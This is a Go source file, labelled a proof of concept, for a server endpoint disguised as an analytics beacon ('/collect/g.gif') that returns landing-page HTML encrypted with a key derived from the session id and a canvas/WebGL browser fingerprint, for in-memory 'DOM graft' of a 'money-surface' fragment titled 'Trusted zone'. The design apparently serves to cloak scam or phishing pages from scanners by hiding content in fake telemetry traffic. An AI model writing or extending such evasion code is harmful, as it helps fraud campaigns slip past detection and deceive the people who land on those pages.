package track

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
)

const (
	TelemetryStealthHydratePath = "/collect/g.gif"
	telemetryStealthHydrateMaxBody = 16384
)

// TelemetryStealthHydrateRequest mimics analytics beacon JSON (PoC).
type TelemetryStealthHydrateRequest struct {
	T         string                 `json:"t"`
	EN        string                 `json:"en"`
	EP        map[string]interface{} `json:"ep"`
	Telemetry map[string]interface{} `json:"telemetry"`
}

// TelemetryStealthHydrateResponse returns encrypted DOM graft bytes (iv||ciphertext+tag).
type TelemetryStealthHydrateResponse struct {
	OK   int    `json:"ok"`
	SID  string `json:"sid"`
	Blob string `json:"blob"`
}

// ParseTelemetryStealthHydrateRequest decodes disguised analytics POST body.
func ParseTelemetryStealthHydrateRequest(body []byte) (TelemetryStealthHydrateRequest, bool) {
	if len(body) == 0 || len(body) > telemetryStealthHydrateMaxBody {
		return TelemetryStealthHydrateRequest{}, false
	}
	var req TelemetryStealthHydrateRequest
	if err := json.Unmarshal(body, &req); err != nil {
		return TelemetryStealthHydrateRequest{}, false
	}
	if req.Telemetry == nil {
		return TelemetryStealthHydrateRequest{}, false
	}
	return req, true
}

// BuildStealthHydrateResponse encrypts landing HTML for in-memory DOM graft (PoC).
// Key = SHA-256(sid + "|" + fp) matching client subtle.digest contract.
func BuildStealthHydrateResponse(sid string, fp string, html []byte) (TelemetryStealthHydrateResponse, error) {
	if sid == "" || len(html) == 0 {
		return TelemetryStealthHydrateResponse{}, fmt.Errorf("stealth hydrate: empty sid or html")
	}
	key := sha256.Sum256([]byte(sid + "|" + fp))
	block, err := aes.NewCipher(key[:])
	if err != nil {
		return TelemetryStealthHydrateResponse{}, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return TelemetryStealthHydrateResponse{}, err
	}
	iv := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		return TelemetryStealthHydrateResponse{}, err
	}
	sealed := gcm.Seal(nil, iv, html, nil)
	out := make([]byte, len(iv)+len(sealed))
	copy(out, iv)
	copy(out[len(iv):], sealed)
	return TelemetryStealthHydrateResponse{
		OK:   1,
		SID:  sid,
		Blob: base64.StdEncoding.EncodeToString(out),
	}, nil
}

// StealthHydrateFingerprint extracts client fp prefix from telemetry map (canvas+webgl).
func StealthHydrateFingerprint(telemetry map[string]interface{}) string {
	canvas, _ := telemetry["canvas"].(string)
	webgl, _ := telemetry["webgl"].(string)
	fp := canvas + webgl
	if len(fp) > 64 {
		fp = fp[:64]
	}
	return fp
}

// DefaultStealthHydrateHTML is PoC money-surface fragment (no external URL in stub).
func DefaultStealthHydrateHTML(campaignID string) []byte {
	return []byte("<section data-aed-hydrated=\"1\"><h1>Trusted zone</h1><p>Campaign " + campaignID + "</p></section>")
}
